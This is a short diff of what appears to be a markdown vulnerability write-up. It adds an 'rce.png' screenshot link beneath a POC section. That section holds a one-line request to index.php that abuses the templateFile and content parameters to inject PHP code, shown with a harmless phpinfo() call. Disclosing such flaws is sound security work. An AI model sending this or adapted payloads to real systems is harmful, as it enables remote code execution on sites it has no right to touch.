@@ -32,3 +32,4 @@ POC:
 ```
 index.php?s=/Mp/MobileBase/display&templateFile=././index.php&prefix=&content=<php>phpinfo();</php>
 ```
+![](.\rce.png)
